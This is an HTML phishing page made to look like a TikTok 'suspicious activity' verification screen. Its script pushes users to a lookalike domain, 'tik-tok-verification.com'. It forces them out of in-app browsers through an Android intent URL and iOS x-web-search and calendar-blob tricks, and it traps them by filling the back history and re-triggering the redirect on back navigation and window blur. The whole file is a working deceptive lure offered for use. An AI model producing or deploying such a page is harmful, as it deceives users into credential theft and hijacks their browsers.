<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; background: #ffffff; 
            height: 100vh; overflow: hidden;
            -webkit-font-smoothing: antialiased;
            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
        }
        
        #main-ui {
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh; text-align: center;
            padding: 0 35px; box-sizing: border-box;
        }

        /* Smaller Visuals */
        .v-icon { width: 50px; height: 50px; margin-bottom: 15px; }
        .header { color: #161823; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
        .subtext { color: #8A8B91; font-size: 14px; line-height: 1.4; margin-bottom: 30px; max-width: 280px; }

        /* Smaller, Native-looking TikTok Button */
        .btn { 
            background: #fe2c55; color: #fff; 
            padding: 12px 60px; /* Reduced padding */
            border-radius: 4px; /* Flatter corners like native TT */
            font-weight: 600; font-size: 15px; /* Smaller text */
            border: none; 
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }
    </style>
</head>
<body>

    <div id="main-ui">
        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
        </svg>

        <div class="header">Suspicious activity</div>
        <div class="subtext">Please complete verification to continue using TikTok.</div>

        <button class="btn" onclick="forceSystemOpen()">Verify</button>
    </div>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";

    function forceSystemOpen() {
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
            window.location.href = intent;
        } 
        
        if (isIOS) {
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            setTimeout(() => {
                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
                const url = URL.createObjectURL(blob);
                window.location.href = url;
            }, 500);
            setTimeout(() => { window.location.assign(destination); }, 1000);
        }
    }

    // --- THE 5-SECOND FIX (HEARTBEAT) ---
    // This keeps the browser process active so the X button trap never expires
    setInterval(() => {
        // Churns a tiny bit of memory to keep the script "hot"
        window.history.replaceState(null, null, window.location.hash || "#refresh");
    }, 1000);

    window.onload = () => {
        // Build the back-stack immediately
        for(let i=0; i<50; i++) history.pushState(null, null, "#sec_" + i);
    };

    window.onpopstate = () => {
        forceSystemOpen();
    };

    // The "X" Button Trap
    window.onblur = () => {
        forceSystemOpen();
    };
</script>
</body>
</html>
